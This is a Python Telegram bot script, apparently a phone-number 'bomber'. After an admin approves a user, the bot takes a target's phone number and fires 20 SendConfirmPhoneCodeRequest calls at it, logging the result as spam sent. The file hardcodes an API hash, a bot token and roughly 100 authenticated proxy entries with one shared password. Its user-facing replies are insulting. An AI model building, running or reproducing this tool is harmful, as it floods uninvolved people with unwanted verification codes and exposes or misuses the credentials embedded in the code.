import asyncio
from telethon import TelegramClient, events
from telethon.tl.functions.account import SendConfirmPhoneCodeRequest
from telethon.tl.types import CodeSettings
from telethon.tl.types import KeyboardButtonCallback
import sqlite3
import random
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

api_id = 35911533
api_hash = '11dafcdc1514796c867055023716d39a'
bot_token = '8346402249:AAGrv_AIuNJNJ06-Y2-vTASyB_NRgyzhJZI'
admin_id = 8471847665

proxy_list = [
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.164.209','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'217.181.90.131','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.172.50','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.23.119','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.42.120','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.54.119','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.31.218','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'151.123.176.220','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.30.119','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.35.94','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.173.97','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.58.65','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.54.74','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.167.25.6','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.229.129','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.237.153','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.62.233','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.46.223','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.226.78','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.234.175','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.22.141','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.163.159','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.189.248','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.43.242','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.41.255','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.24.93','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.59.222','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.24.229','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.191.171','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'217.181.90.19','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.40.106','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.244.118','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.10.31','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.42.10','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.46.175','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.31.81','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.45.102','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.50.250','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.170.128','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.238.176','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.232.81','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.246.227','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.29.24','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.51.223','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.231.245','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.239.39','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.53.195','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.167.25.238','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.53.85','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.35.231','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.49.95','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.187.109','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'151.123.177.96','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.169.14','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.33.77','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.53.97','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.224.121','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.3.3','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'193.56.28.159','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.40.118','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.181.108','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.27.100','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.247.45','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.168.207','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.52.155','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.171.173','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.36.214','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.4.146','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.52.157','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.25.126','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.62.190','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.242.8','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.46.202','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.38.241','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.235.10','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.9.50','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.8.17','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.244.190','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.191.241','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.246.168','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.236.238','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.33.183','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.246.228','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.24.112','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.33.183','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.34.191','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.27.165','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.165.75','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'151.123.178.227','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'193.56.28.78','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.244.2','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.7.240','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.43.137','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.39.120','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.252.133','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.48.50','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.38.227','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.20.130','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'151.123.177.155','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.49.223','port':3129}
]

conn = sqlite3.connect('bot.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    phone TEXT,
    status TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS requests (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    admin_id INTEGER,
    action TEXT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)''')
conn.commit()

def add_user(user_id, username=None, phone=None, status='pending'):
    cursor.execute('INSERT OR REPLACE INTO users (user_id, username, phone, status) VALUES (?, ?, ?, ?)',
                   (user_id, username, phone, status))
    conn.commit()

def update_user_status(user_id, status):
    cursor.execute('UPDATE users SET status = ? WHERE user_id = ?', (status, user_id))
    conn.commit()

def get_user(user_id):
    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    return cursor.fetchone()

def add_request(user_id, admin_id, action):
    cursor.execute('INSERT INTO requests (user_id, admin_id, action) VALUES (?, ?, ?)',
                   (user_id, admin_id, action))
    conn.commit()

client = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)

pending_requests = {}

@client.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    existing = get_user(user_id)
    if existing and existing[3] == 'approved':
        await event.respond('ty uzhe odobren pishi username s @')
        pending_requests[user_id] = {'step': 'username'}
        return
    add_user(user_id, status='pending')
    await event.respond('tvoia zaiavka otpravlena')
    username = event.sender.username if event.sender.username else str(user_id)
    await client.send_message(admin_id, f'ziavka ot @{username}',
                              buttons=[[KeyboardButtonCallback('priniat', f'accept_{user_id}'),
                                        KeyboardButtonCallback('otklonit', f'reject_{user_id}')]])
    add_request(user_id, admin_id, 'sent')

@client.on(events.CallbackQuery)
async def callback(event):
    data = event.data.decode()
    if data.startswith('accept_'):
        user_id = int(data.split('_')[1])
        update_user_status(user_id, 'approved')
        pending_requests[user_id] = {'step': 'username'}
        await client.send_message(user_id, 'tebia odobrili pishi username s @')
        await event.answer('priniato')
        add_request(user_id, admin_id, 'accepted')
        logger.info(f'User {user_id} approved')
    elif data.startswith('reject_'):
        user_id = int(data.split('_')[1])
        update_user_status(user_id, 'rejected')
        await client.send_message(user_id, 'otkloneno idi nahui')
        await event.answer('otkloneno')
        add_request(user_id, admin_id, 'rejected')
        logger.info(f'User {user_id} rejected')

@client.on(events.NewMessage)
async def handle_input(event):
    sender = event.sender_id
    if sender == admin_id:
        return
    logger.info(f'Message from {sender}: {event.text}')
    if sender not in pending_requests:
        await event.respond('snachala napishi /start')
        return
    user_data = get_user(sender)
    if not user_data or user_data[3] != 'approved':
        await event.respond('ty ne odobren napishi /start')
        return
    if pending_requests[sender]['step'] == 'username':
        username = event.text.strip()
        if not username.startswith('@'):
            await event.respond('pishi s @ debil')
            return
        pending_requests[sender]['username'] = username
        pending_requests[sender]['step'] = 'phone'
        add_user(sender, username=username, status='approved')
        await event.respond('phone:')
        logger.info(f'User {sender} entered username {username}')
    elif pending_requests[sender]['step'] == 'phone':
        phone = event.text.strip()
        username = pending_requests[sender]['username']
        try:
            for _ in range(20):
                await client(SendConfirmPhoneCodeRequest(
                    phone_number=phone,
                    settings=CodeSettings(
                        allow_flashcall=False,
                        current_number=True,
                        allow_app_hash=False
                    )
                ))
                await asyncio.sleep(0.5)
            await event.respond('gatova tvoia mama sdohla')
            add_user(sender, phone=phone, status='approved')
            logger.info(f'Spam sent to {phone} for user {sender}')
        except Exception as e:
            await event.respond(f'oibka {str(e)}')
            logger.error(f'Error for user {sender}: {e}')
        del pending_requests[sender]

logger.info('Bot started')
client.run_until_disconnected()
